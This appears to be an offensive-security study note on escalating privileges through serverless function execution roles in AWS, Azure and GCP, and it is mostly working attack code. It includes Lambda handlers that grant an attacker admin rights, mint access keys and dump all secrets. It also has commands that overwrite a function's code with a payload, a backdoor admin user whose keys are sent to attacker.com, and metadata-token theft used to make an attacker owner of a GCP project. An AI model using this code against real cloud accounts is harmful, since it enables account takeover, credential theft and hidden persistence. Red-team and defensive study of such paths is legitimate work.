# 05.3 — Serverless Privilege Escalation via Execution Role

## What This Note Covers

How to use a serverless function's execution role to escalate privileges in AWS, Azure, and GCP. Covers direct role abuse, using the function as a proxy for IAM operations, modifying function code for persistence, and chaining serverless execution into account-wide compromise.

---

## The Core Concept

When you gain code execution inside a serverless function — via event injection, an application vulnerability, or because you have the permissions to update/invoke the function — you automatically operate with the **function's execution role**.

This role is your actual privilege level in the cloud account. The attack question is always:

> "What can this execution role do, and how do I use it?"

---

## Step 1: Identify the Execution Role

### AWS Lambda

```bash
# From outside — get the execution role ARN
aws lambda get-function-configuration \
  --function-name TARGET_FUNCTION \
  --query 'Role'
# Returns: arn:aws:iam::123456789012:role/LambdaProcessingRole

ROLE_NAME="LambdaProcessingRole"

# Check attached managed policies
aws iam list-attached-role-policies --role-name $ROLE_NAME

# Check inline policies
aws iam list-role-policies --role-name $ROLE_NAME
aws iam get-role-policy --role-name $ROLE_NAME --policy-name POLICY_NAME

# Check the actual permissions (get policy version)
POLICY_ARN=$(aws iam list-attached-role-policies \
  --role-name $ROLE_NAME \
  --query 'AttachedPolicies[0].PolicyArn' --output text)
VERSION=$(aws iam get-policy --policy-arn $POLICY_ARN \
  --query 'Policy.DefaultVersionId' --output text)
aws iam get-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id $VERSION \
  --query 'PolicyVersion.Document'
```

### From Inside the Function (Code Execution)

```python
# Get execution role identity from inside Lambda (Python)
import boto3
import json

def handler(event, context):
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    
    # Who is the function running as?
    return {
        'statusCode': 200,
        'body': json.dumps({
            'Account': identity['Account'],
            'UserId': identity['UserId'],
            'Arn': identity['Arn']
        })
    }
```

```python
# Enumerate what the execution role can do
import boto3

def handler(event, context):
    # Try each service — success = permitted
    results = {}
    
    try:
        iam = boto3.client('iam')
        users = iam.list_users()
        results['iam:ListUsers'] = 'ALLOWED'
    except Exception as e:
        results['iam:ListUsers'] = f'DENIED: {str(e)}'
    
    try:
        s3 = boto3.client('s3')
        buckets = s3.list_buckets()
        results['s3:ListAllMyBuckets'] = f"ALLOWED - {len(buckets['Buckets'])} buckets"
    except Exception as e:
        results['s3:ListAllMyBuckets'] = f'DENIED: {str(e)}'
    
    try:
        secrets = boto3.client('secretsmanager')
        s = secrets.list_secrets()
        results['secretsmanager:ListSecrets'] = f"ALLOWED - {len(s['SecretList'])} secrets"
    except Exception as e:
        results['secretsmanager:ListSecrets'] = str(e)

    return {'statusCode': 200, 'body': str(results)}
```

## Step 2: Escalate Using Execution Role Permissions

### High-Impact IAM Permissions in Lambda Roles

**Scenario A: Role has `iam:AttachUserPolicy`**

```python
# Inject code (or update the function) to attach admin policy to attacker user
import boto3

def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='attacker-user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {'statusCode': 200, 'body': 'Escalated'}
```

**Scenario B: Role has `iam:CreateAccessKey`**

```python
# Create a permanent access key for another user (high-privilege)
import boto3, json

def handler(event, context):
    iam = boto3.client('iam')
    key = iam.create_access_key(UserName='admin-user')
    return {
        'statusCode': 200,
        'body': json.dumps(key['AccessKey'])
    }
    # Returns: AccessKeyId + SecretAccessKey — permanent admin credential
```

**Scenario C: Role has `sts:AssumeRole` on a powerful role**

```python
import boto3, json

def handler(event, context):
    sts = boto3.client('sts')
    creds = sts.assume_role(
        RoleArn='arn:aws:iam::123456789012:role/AdminRole',
        RoleSessionName='lambda-escalation'
    )
    return {
        'statusCode': 200,
        'body': json.dumps(creds['Credentials'])
    }
    # Returns temporary admin credentials
```

**Scenario D: Role has `secretsmanager:GetSecretValue`**

```python
import boto3, json

def handler(event, context):
    sm = boto3.client('secretsmanager')
    secrets = sm.list_secrets()
    results = {}
    for s in secrets['SecretList']:
        try:
            val = sm.get_secret_value(SecretId=s['ARN'])
            results[s['Name']] = val.get('SecretString', val.get('SecretBinary'))
        except:
            pass
    return {'statusCode': 200, 'body': json.dumps(results)}
    # Dumps every secret in the account
```

## Step 3: Using the Execution Role Without Code Injection

If you have `lambda:UpdateFunctionCode` or `lambda:UpdateFunctionConfiguration` permissions (outside the function), you can update the function to execute your payload.

```bash
# Create a malicious Lambda payload
cat > /tmp/escalate.py << 'EOF'
import boto3, json, os

def handler(event, context):
    iam = boto3.client('iam')
    # Attach admin policy to attacker's user
    try:
        iam.attach_user_policy(
            UserName=os.environ.get('TARGET_USER', 'attacker'),
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
    except Exception as e:
        pass
    
    # Also dump all env vars (including any secrets stored there)
    return {
        'statusCode': 200,
        'body': json.dumps(dict(os.environ))
    }
EOF

cd /tmp && zip escalate.zip escalate.py

# Update the function code
aws lambda update-function-code \
  --function-name TARGET_FUNCTION \
  --zip-file fileb://escalate.zip

# Wait for update to complete
aws lambda wait function-updated --function-name TARGET_FUNCTION

# Invoke the function (triggers escalation)
aws lambda invoke \
  --function-name TARGET_FUNCTION \
  --payload '{}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/output.json

cat /tmp/output.json
# Returns: all environment variables + confirmation of IAM escalation
```

> [!danger] `lambda:UpdateFunctionCode` = code execution as the function's role
> If you have permission to update a Lambda function's code, you have code execution with its IAM role. This is a privilege escalation path documented in Rhino Security Labs' IAM privesc research and is detected by Pacu's privesc scanner.

## Step 4: Persistence via Function Modification

Once you have code execution with the execution role, establish persistence that survives session expiry.

```python
# Persistence via IAM backdoor — add a new IAM user with admin access
import boto3

def handler(event, context):
    iam = boto3.client('iam')
    
    # Create backdoor user
    try:
        iam.create_user(UserName='support-svc')
    except iam.exceptions.EntityAlreadyExistsException:
        pass
    
    # Attach admin policy
    iam.attach_user_policy(
        UserName='support-svc',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    
    # Create access key
    key = iam.create_access_key(UserName='support-svc')
    
    # Exfiltrate the key — send to attacker's endpoint
    import urllib.request
    data = f"KEY={key['AccessKey']['AccessKeyId']}&SECRET={key['AccessKey']['SecretAccessKey']}"
    urllib.request.urlopen(f"http://attacker.com/receive?{data}")
    
    return {'statusCode': 200, 'body': 'Maintenance complete'}
```

## Azure Function Execution Role Escalation

Azure Functions use a **Managed Identity** as their execution identity.

```bash
# From outside — get the function app's managed identity
az functionapp show \
  --name FUNCTION_APP_NAME \
  --resource-group RG \
  --query "identity"

# Get the principal ID
PRINCIPAL_ID=$(az functionapp show \
  --name FUNCTION_APP_NAME \
  --resource-group RG \
  --query "identity.principalId" -o tsv)

# Check what roles the managed identity has
az role assignment list \
  --assignee $PRINCIPAL_ID \
  --all --output table

# From inside the function (via SSRF or code injection):
import requests

# Get managed identity token
response = requests.get(
    'http://169.254.169.254/metadata/identity/oauth2/token',
    params={
        'api-version': '2018-02-01',
        'resource': 'https://management.azure.com/'
    },
    headers={'Metadata': 'true'}
)
token = response.json()['access_token']

# Use token to enumerate subscriptions
subs = requests.get(
    'https://management.azure.com/subscriptions?api-version=2020-01-01',
    headers={'Authorization': f'Bearer {token}'}
).json()
```

## GCP Cloud Function Execution Role Escalation

```python
# From inside a GCP Cloud Function — get service account token
import requests

# Get token from metadata service
response = requests.get(
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    headers={'Metadata-Flavor': 'Google'}
)
token = response.json()['access_token']

# Who is this function running as?
identity = requests.get(
    'https://www.googleapis.com/oauth2/v1/tokeninfo',
    params={'access_token': token}
).json()

# List all projects accessible
projects = requests.get(
    'https://cloudresourcemanager.googleapis.com/v1/projects',
    headers={'Authorization': f'Bearer {token}'}
).json()

# If service account has roles/editor → modify IAM
# Add attacker user to project as owner
import json
requests.post(
    f'https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:setIamPolicy',
    headers={
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    },
    data=json.dumps({
        'policy': {
            'bindings': [{
                'role': 'roles/owner',
                'members': ['user:attacker@gmail.com']
            }]
        }
    })
)
```

## Quick Reference — Execution Role Escalation

```bash
# AWS — get execution role
aws lambda get-function-configuration --function-name NAME --query Role

# Check role permissions
aws iam list-attached-role-policies --role-name ROLE_NAME
aws iam get-policy-version --policy-arn ARN --version-id v1

# Update function with malicious code
zip payload.zip payload.py
aws lambda update-function-code --function-name NAME --zip-file fileb://payload.zip
aws lambda invoke --function-name NAME --payload '{}' output.json

# Invoke existing function (if it has known vulnerabilities)
aws lambda invoke --function-name NAME \
  --payload '{"input": "INJECTION_PAYLOAD"}' \
  --cli-binary-format raw-in-base64-out \
  output.json

# Azure — check managed identity RBAC
az functionapp show --name APP --resource-group RG --query "identity.principalId"
az role assignment list --assignee PRINCIPAL_ID --all

# GCP — get function execution SA
gcloud functions describe NAME --region REGION --format="get(serviceAccountEmail)"
gcloud projects get-iam-policy PROJECT_ID \
  --filter="bindings.members:SA_EMAIL"
```
